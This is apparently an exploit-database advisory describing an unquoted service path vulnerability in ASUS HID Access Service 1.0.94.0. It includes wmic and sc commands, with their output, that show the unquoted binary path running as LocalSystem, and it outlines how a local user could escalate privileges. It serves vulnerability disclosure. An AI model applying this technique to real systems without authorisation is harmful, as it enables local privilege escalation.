EXP
---

    # Exploit Title: ASUS HID Access Service 1.0.94.0 - 'AsHidSrv.exe' Unquoted Service Path
    # Date: 2020-05-19
    # Exploit Author: Alejandra Sánchez
    # Vendor Homepage: www.asus.com
    # Version: 1.0.94.0
    # Tested on: Windows 10 Pro x64 es

    # Description:
    ATK Hotkey 1.0.94.0 suffers from an unquoted search path issue impacting the service 'AsHidService'. This could potentially allow an
    authorized but non-privileged local user to execute arbitrary code with elevated privileges on the system. A successful attempt would require
    the local user to be able to insert their code in the system root path undetected by the OS or other security applications where it could
    potentially be executed during application startup or reboot. If successful, the local user’s code would execute with the elevated privileges
    of the application.

    # Prerequisites
    Local, Non-privileged Local User with restart capabilities

    # Details

    C:\>wmic service get name, pathname, displayname, startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
    ASUS HID Access Service               AsHidService               C:\Program Files (x86)\ASUS\ATK Package\ATK Hotkey\AsHidSrv.exe               Auto

    C:\>sc qc "AsHidService"
    [SC] QueryServiceConfig CORRECTO

    NOMBRE_SERVICIO: AsHidService
            TIPO               : 10  WIN32_OWN_PROCESS
            TIPO_INICIO        : 2   AUTO_START
            CONTROL_ERROR      : 1   NORMAL
            NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\ASUS\ATK Package\ATK Hotkey\AsHidSrv.exe
            GRUPO_ORDEN_CARGA  :
            ETIQUETA           : 0
            NOMBRE_MOSTRAR     : ASUS HID Access Service
            DEPENDENCIAS       :
            NOMBRE_INICIO_SERVICIO: LocalSystem